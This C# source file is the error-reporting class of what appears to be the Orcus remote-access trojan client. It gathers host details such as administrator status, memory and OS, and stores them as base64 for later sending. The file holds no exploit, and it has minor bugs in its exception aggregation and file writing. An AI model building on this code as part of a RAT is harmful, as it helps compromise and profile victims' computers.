using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Text;
using Orcus.Config;
using Orcus.Native;
using Orcus.Service;
using Orcus.Shared.Commands.ExceptionHandling;
using Orcus.Shared.NetSerializer;
#if NET35
using Orcus.Extensions;

#endif

namespace Orcus.Utilities
{
    internal class ErrorReporter
    {
        private static ErrorReporter _instance;
        private readonly string _errorFile;
        private readonly object _fileLock = new object();

        private ErrorReporter()
        {
            _errorFile = Consts.ExceptionFile;
            IsDataAvailable = File.Exists(_errorFile);
        }

        public static ErrorReporter Current => _instance ?? (_instance = new ErrorReporter());

        public bool IsDataAvailable { get; private set; }

        public event EventHandler ExceptionsAvailable;

        private string GetExceptionStackTrace(Exception exception)
        {
            if (exception is ReflectionTypeLoadException)
            {
                var stringBuilder = new StringBuilder();
                stringBuilder.AppendLine(exception.StackTrace);
                stringBuilder.AppendLine();
                stringBuilder.AppendLine();
                stringBuilder.AppendLine("LoaderExceptions:");
                stringBuilder.AppendLine();
                var typeLoadException = exception as ReflectionTypeLoadException;
                var loaderExceptions = typeLoadException.LoaderExceptions;
                return loaderExceptions.Aggregate(stringBuilder,
                    (builder, exception1) => builder.AppendLine(exception.ToString() + "\r\n")).ToString();
            }

            return exception.StackTrace;
        }

        public void ReportError(Exception exception, string state)
        {
            var errorReport = new ExceptionInfo
            {
                Message = exception.Message,
                StackTrace = GetExceptionStackTrace(exception),
                ErrorType = exception.GetType().ToString(),
                Timestamp = DateTime.UtcNow,
                ProcessMemory = GC.GetTotalMemory(true),
                IsServiceRunning = ServiceConnection.Current.IsConnected,
                IsAdministrator = User.IsAdministrator,
                ProcessPath = Consts.ApplicationPath,
#if NET35
                Is64BitSystem = EnvironmentExtensions.Is64BitOperatingSystem,
                Is64BitProcess = EnvironmentExtensions.Is64BitProcess,
#else
                Is64BitSystem = Environment.Is64BitOperatingSystem,
                Is64BitProcess = Environment.Is64BitProcess,
#endif
                RuntimeVersion = Environment.Version.ToString(),
                State = state,
                ClientVersion = Program.Version
            };

            var memStatus = new MEMORYSTATUSEX();
            if (NativeMethods.GlobalMemoryStatusEx(memStatus))
            {
                errorReport.TotalMemory = memStatus.ullTotalPhys;
                errorReport.AvailableMemory = memStatus.ullAvailPhys;
            }

            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem"))
                    errorReport.OsName =
                        searcher.Get().OfType<ManagementObject>().FirstOrDefault()?["Caption"].ToString();
            }
            catch (Exception)
            {
                // ignored
            }

            if (string.IsNullOrEmpty(errorReport.OsName))
                errorReport.OsName = Environment.OSVersion.ToString();

            var serializer = new Serializer(typeof (List<ExceptionInfo>));

            // ReSharper disable once AssignNullToNotNullAttribute
            Directory.CreateDirectory(Path.GetDirectoryName(_errorFile));

            lock (_fileLock)
                using (var fileStream = new FileStream(_errorFile, FileMode.OpenOrCreate, FileAccess.Write))
                using (var streamWriter = new StreamWriter(fileStream))
                    streamWriter.WriteLine(Convert.ToBase64String(serializer.Serialize(errorReport)));

            IsDataAvailable = true;
            ExceptionsAvailable?.Invoke(this, EventArgs.Empty);
        }

        public List<ExceptionInfo> GetData()
        {
            if (!File.Exists(_errorFile))
                return null;

            var result = new List<ExceptionInfo>();

            var serializer = new Serializer(typeof (List<ExceptionInfo>));

            lock (_fileLock)
                using (var fileStream = new FileStream(_errorFile, FileMode.Open, FileAccess.Read))
                using (var streamReader = new StreamReader(fileStream))
                {
                    while (!streamReader.EndOfStream)
                    {
                        var line = streamReader.ReadLine();
                        if (string.IsNullOrEmpty(line))
                            continue;

                        try
                        {
                            result.Add(serializer.Deserialize<ExceptionInfo>(Convert.FromBase64String(line), 0));
                        }
                        catch (Exception)
                        {
                            // ignored
                        }
                    }
                }

            return result;
        }

        public void ExceptionSent()
        {
            var errorFile = new FileInfo(_errorFile);
            if (errorFile.Exists)
                lock (_errorFile)
                    errorFile.Delete();

            IsDataAvailable = false;
        }
    }
}